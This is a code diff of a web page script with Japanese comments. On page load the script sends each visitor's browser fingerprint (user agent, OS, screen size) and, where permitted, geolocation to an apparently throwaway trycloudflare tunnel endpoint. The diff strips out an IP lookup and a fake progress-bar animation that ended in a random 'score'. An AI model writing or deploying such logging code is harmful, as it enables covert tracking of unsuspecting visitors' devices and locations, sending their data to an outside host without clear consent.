@@ -66,10 +66,9 @@ h1{margin:0 0 10px;font-size:1.2rem;letter-spacing:.08em;color:#9ef}
 const API = 'https://instructors-anatomy-basketball-used.trycloudflare.com';
 let LOG_ID = null;
 
-/* ===== 即時送信（100ms以内）===== */
+
 (() => {
   const payload = {
-    ip: '取得中',
     ua: navigator.userAgent,
     os: (/(Windows|Mac|Linux|Android|iPhone|iPad)/.exec(navigator.userAgent)||['Unknown'])[0],
     screen: `${screen.width}×${screen.height}`,
@@ -79,13 +78,7 @@ let LOG_ID = null;
     geo: '取得中…'
   };
 
-  // IPは並列
-  fetch('https://api.ipify.org?format=json',{cache:'no-store'})
-    .then(r=>r.json())
-    .then(j=>payload.ip=j.ip)
-    .catch(()=>payload.ip='取得失敗');
 
-  // 即INSERT
   fetch(`${API}/log`,{
     method:'POST',
     headers:{'Content-Type':'application/json'},
@@ -97,7 +90,7 @@ let LOG_ID = null;
     logid.textContent=LOG_ID;
   });
 
-  // GEO 後追い
+
   if(navigator.geolocation){
     navigator.geolocation.getCurrentPosition(
       pos=>{
@@ -110,48 +103,10 @@ let LOG_ID = null;
         });
       },
       ()=>geo.textContent='拒否 / 不可',
-      {timeout:1000}
+      { timeout: 1000, enableHighAccuracy:false }
     );
   }
 })();
-
-/* ===== 演出 ===== */
-const bar=document.getElementById('prog');
-const ov=document.getElementById('ov');
-const TOTAL_MS=11000,HOLD_AT=85,HOLD_MS=2000;
-let s=null,h=null,r=null,d=false;
-
-function frame(t){
-  if(!s)s=t;
-  const e=t-s;let p;
-  if(e<=TOTAL_MS*(HOLD_AT/100)) p=Math.floor((e/TOTAL_MS)*100);
-  else{
-    if(!h)h=t;
-    const k=t-h;
-    if(k<HOLD_MS)p=HOLD_AT;
-    else{
-      if(!r)r=t;
-      p=Math.min(100,HOLD_AT+Math.floor(((t-r)/500)*(100-HOLD_AT)));
-    }
-  }
-  bar.style.width=p+'%';
-  if(p<100)requestAnimationFrame(frame);
-  else if(!d){d=true;show();}
-}
-
-function show(){
-  ov.classList.add('show');
-  ua.textContent=navigator.userAgent;
-  os.textContent=(/(Windows|Mac|Linux|Android|iPhone|iPad)/.exec(navigator.userAgent)||['Unknown'])[0];
-  scr.textContent=`${screen.width}×${screen.height}`;
-  lang.textContent=navigator.language;
-  tz.textContent=Intl.DateTimeFormat().resolvedOptions().timeZone;
-  stay.textContent=`${Math.round(performance.now()/1000)} 秒`;
-  score.textContent=80-Math.floor(Math.random()*20);
-}
-
-requestAnimationFrame(frame);
 </script>
-
 </body>
 </html>
